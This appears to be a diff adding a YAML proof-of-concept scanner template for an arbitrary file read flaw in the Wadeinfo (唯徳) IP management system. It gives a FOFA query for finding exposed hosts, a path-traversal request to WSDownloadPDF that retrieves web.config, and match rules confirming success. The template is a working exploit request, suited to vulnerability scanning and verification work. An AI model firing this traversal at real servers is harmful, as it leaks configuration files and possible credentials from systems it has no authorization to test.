@@ -1,0 +1,24 @@
+id: poc-yaml-wadeinfo-ipms-wsdownloadpdf-anyfile-read
+info:
+  name: 唯徳知识产权管理系统 WSDownloadPDF 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 唯徳知识产权管理系统
+  fofa: body="JSCOMM/language.js"
+requests:
+- method: GET
+  path: /wxInterface/Case.ashx/WSDownloadPDF?file_type=1&app_no=../../&file=web.config
+  expression: 'status_code == 200 &&
+
+    contains(body,"</system.web>") &&
+
+    contains(body,"<configuration>") &&
+
+    contains(headers,"filename=web.config") &&
+
+    contains(content_type,"application/octet-stream")
+
+    '
+variables: {}
+transport: http
